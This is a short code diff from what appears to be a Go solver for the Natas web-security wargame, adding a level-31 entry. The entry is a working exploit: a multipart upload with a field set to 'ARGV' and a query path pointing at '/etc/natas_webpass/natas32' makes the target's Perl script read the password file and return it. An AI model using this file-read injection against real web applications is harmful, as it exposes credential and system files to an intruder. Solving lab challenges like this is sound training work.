@@ -444,6 +444,23 @@ var levels = [...]Grabber{
 		"natas31",
 		32,
 	},
+	//level 31
+	Prefixed{
+		Query{
+			Post{
+				grab,
+				SetData{"file": Text{"ARGV"}},
+				&File{
+					Text{"file"},
+					Text{"1"},
+					memio.Buffer("1"),
+				},
+			},
+			Text{url.QueryEscape("/etc/natas_webpass/natas32")},
+		},
+		"<tr><th>",
+		32,
+	},
 }
 
 func e(err error) {
